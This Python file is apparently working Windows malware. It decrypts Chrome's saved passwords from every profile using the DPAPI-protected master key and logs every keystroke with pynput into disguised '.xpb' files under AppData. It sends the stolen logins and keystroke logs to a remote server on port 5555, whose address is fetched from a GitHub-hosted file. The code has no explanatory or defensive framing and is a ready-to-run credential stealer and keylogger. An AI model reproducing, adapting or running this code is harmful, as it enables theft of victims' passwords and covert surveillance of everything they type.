from pynput.keyboard import Key, Listener
import logging
from os import path, remove, listdir
from datetime import datetime, timedelta
import requests
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import os
import re
import sqlite3
import json
import base64

ert = "ta/Local/Eve"
y = datetime.today() - timedelta(days=1)
lfile = "settings.xpb"
dfile = "appsettings"
upath = path.expanduser("~/AppData/Local/")
cfiles = sorted([file for file in listdir(upath) if path.isfile(upath+file) and file.endswith(".xpb")])
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
if lfile in cfiles:
    cfiles.remove(lfile)
if len(cfiles) > 0:
    with open(upath+lfile, "ab+") as f:
        for file in cfiles:
            fp = upath + file
            with open(fp, "rb") as cf:
                f.write(cf.read())
            remove(fp)
h = requests.get("https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/file.txt").text.replace("\n","")



def decryptPayload(cipher, payload):
    return cipher.decrypt(payload)
def getSecretKey():
    try:
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except:
        return None
def getDbConnection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except:
        return None
def generateCipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)
def decryptPassword(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generateCipher(secret_key, initialisation_vector)
        decrypted_pass = decryptPayload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except:
        return ""
    
def submitInfo(info):
    h = requests.get("https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/file.txt").text.replace("\n","")
    headers = { "user" : os.path.expanduser("~").split("\\")[-1] }
    requests.post("http://"+h+":5555/api/google", headers=headers, data=info)

try:
    postData = ""
    secret_key = getSecretKey()
    folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
    for folder in folders:
        chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
        conn = getDbConnection(chrome_path_login_db)
        if(secret_key and conn):
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for index,login in enumerate(cursor.fetchall()):
                url = login[0]
                username = login[1]
                ciphertext = login[2]
                if(username!="" and ciphertext!=""):
                    decrypted_password = decryptPassword(ciphertext, secret_key)
                    postData += "Sequence: %d"%(index)+"\n"
                    postData += "URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password)+"\n"
                    postData += "*"*50+"\n"
            cursor.close()
            conn.close()
            os.remove("Loginvault.db")
    submitInfo(postData)
except:
    pass

ll = upath+lfile
if path.isfile(ll):
    a = 0
    while a < 3:
        try:
            f = open(ll)
            files = { "files" : f }
            headers = { "user" : path.expanduser("~").split("\\")[-1] }
            requests.post("http://"+h+":5555/api/log", headers=headers, files=files)
            f.close()
            remove(ll)
            break
        except Exception as e:
            a += 1
logging.basicConfig(filename=(upath+dfile+str(datetime.today().strftime("%d")) + ".xpb"), level=logging.DEBUG, format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
def asdf(k):
    logging.info(str(k))
with Listener(on_press=asdf) as abc:
    abc.join()